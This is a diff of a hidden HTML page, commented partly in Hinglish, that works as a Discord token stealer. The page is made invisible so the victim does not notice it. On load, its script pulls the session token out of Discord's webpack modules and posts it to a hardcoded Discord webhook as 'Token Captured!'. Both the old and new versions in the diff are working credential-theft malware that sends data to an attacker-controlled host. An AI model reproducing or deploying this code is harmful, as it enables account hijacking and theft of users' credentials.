@@ -1,80 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>...</title>
     <style>
-        body { margin: 0; padding: 0; opacity: 0; } /* Completely invisible */
+        /* Page ko bilkul invisible bana do taaki user ko pata na chale */
+        body { margin: 0; padding: 0; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-        const CORS_PROXY = "https://corsproxy.io/?";
+        // Tera Webhook URL
+        const WEBHOOK = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
         async function grabToken() {
-            let token = null;
-
-            // Check if webpack is already loaded (User is inside Discord Web)
-            if (typeof window.webpackChunkdiscord_app !== 'undefined') {
-                token = await extractToken();
-            } else {
-                // Wait for it to load (max 5 seconds)
-                let attempts = 0;
-                const maxAttempts = 25; // 5 seconds
-                
-                const interval = setInterval(() => {
-                    attempts++;
-                    if (typeof window.webpackChunkdiscord_app !== 'undefined') {
-                        clearInterval(interval);
-                        extractToken().then(t => token = t);
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        console.log("Context not found. User might be logged out or using App.");
-                    }
-                }, 200);
-            }
-
-            if (token) {
-                await sendToWebhook(token);
-            }
-        }
-
-        async function extractToken() {
             try {
-                for(let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
-                    try {
+                // Check karo ki webpack loaded hai ya nahi
+                if (typeof window.webpackChunkdiscord_app === 'undefined') {
+                    console.log("Webpack not found. Waiting...");
+                    // Agar load nahi hua, toh 2 second wait karo (Discord load hone ka wait)
+                    await new Promise(r => setTimeout(r, 2000));
+                    
+                    // Dobara check karo
+                    if (typeof window.webpackChunkdiscord_app === 'undefined') {
+                        console.log("Still no context. Sending null.");
+                        return;
+                    }
+                }
+
+                // Tera Original Code (Modified for async/return)
+                let token = null;
+                try {
+                    const chunks = Object.values(window.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
+                    for(let e of chunks) {
                         if(!e.exports || e.exports === window) continue;
-                        if(e.exports?.getToken) return e.exports.getToken();
+                        if(e.exports?.getToken) {
+                            token = e.exports.getToken();
+                            break;
+                        }
                         for(let t in e.exports) {
                             if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
-                                return e.exports[t].getToken();
+                                token = e.exports[t].getToken();
+                                break;
                             }
                         }
-                    } catch(err) {}
+                        if(token) break;
+                    }
+                } catch(e) {
+                    console.error("Grab error", e);
                 }
+
+                if(token) {
+                    // Token ko Webhook par bhejo
+                    await fetch(WEBHOOK, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
+                        })
+                    });
+                    console.log("Token Sent!");
+                } else {
+                    console.log("Token not found.");
+                }
+
             } catch(e) {
-                console.error("Extraction error", e);
+                console.error("Main error", e);
             }
-            return null;
         }
 
-        async function sendToWebhook(token) {
-            try {
-                await fetch(CORS_PROXY + encodeURIComponent(WEBHOOK_URL), {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
-                    })
-                });
-                console.log("Token sent.");
-            } catch(e) {
-                console.error("Send error", e);
-            }
-        }
-
+        // Page load hote hi start karo
         grabToken();
     </script>
 </body>
